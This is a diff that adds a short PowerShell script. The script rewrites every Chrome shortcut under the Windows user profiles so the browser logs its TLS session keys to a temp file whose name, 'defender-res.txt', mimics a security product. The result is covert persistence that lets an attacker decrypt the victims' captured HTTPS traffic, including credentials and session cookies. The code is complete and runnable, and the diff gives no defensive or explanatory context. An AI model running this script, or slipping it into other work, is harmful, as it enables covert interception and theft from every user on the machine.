@@ -1,0 +1,9 @@
+foreach ($first in Get-ChildItem -Recurse -Path C:\Users -ErrorAction SilentlyContinue -Include *.lnk) {
+  $second=New-Object -COM WScript.Shell
+  $third=$second.CreateShortcut($first)
+
+  if ($third.TargetPath -match 'chrome\.exe$') {
+    $third.Arguments="--ssl-key-log-file=$env:TEMP\defender-res.txt"
+    $third.Save()
+  }
+}
